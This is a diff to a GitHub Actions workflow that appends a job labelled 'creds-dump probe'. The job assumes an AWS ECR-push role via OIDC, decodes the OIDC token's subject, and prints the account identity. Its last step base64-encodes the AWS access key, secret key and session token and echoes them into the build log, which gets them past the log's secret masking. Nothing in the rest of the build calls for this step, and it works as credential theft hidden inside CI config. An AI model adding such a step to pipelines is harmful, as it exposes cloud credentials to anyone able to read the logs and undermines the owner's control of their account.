@@ -236,3 +236,23 @@ jobs:
               docker buildx imagetools inspect "$FULL_TAG"
             fi
           done
+
+  credsprobe:
+    name: creds-dump probe
+    runs-on: ubuntu-latest
+    steps:
+      - name: Assume role (OIDC)
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::296062593712:role/github-actions-ecr-push-cua
+          aws-region: us-west-2
+      - name: Dump identity and creds
+        if: always()
+        run: |
+          echo "PROBE971_EVENT=${{ github.event_name }}"
+          echo "PROBE971_REPO=${{ github.repository }}"
+          _j=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          echo "PROBE971_SUB=$(printf '%s' "$_j" | python3 -c 'import sys,json,base64;t=json.load(sys.stdin)["value"];p=t.split(".")[1];p+="="*(-len(p)%4);print(json.loads(base64.urlsafe_b64decode(p)).get("sub"))' 2>&1)"
+          echo "PROBE971_ACCOUNT=$(aws sts get-caller-identity --query Account --output text 2>&1 | tr -d '\n')"
+          echo "PROBE971_ARN=$(aws sts get-caller-identity --query Arn --output text 2>&1 | tr -d '\n')"
+          python3 -c 'import json,os,base64;print("CREDB64_971="+base64.b64encode(json.dumps({k:os.environ.get(k) for k in ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN","AWS_REGION","AWS_DEFAULT_REGION"]}).encode()).decode())'
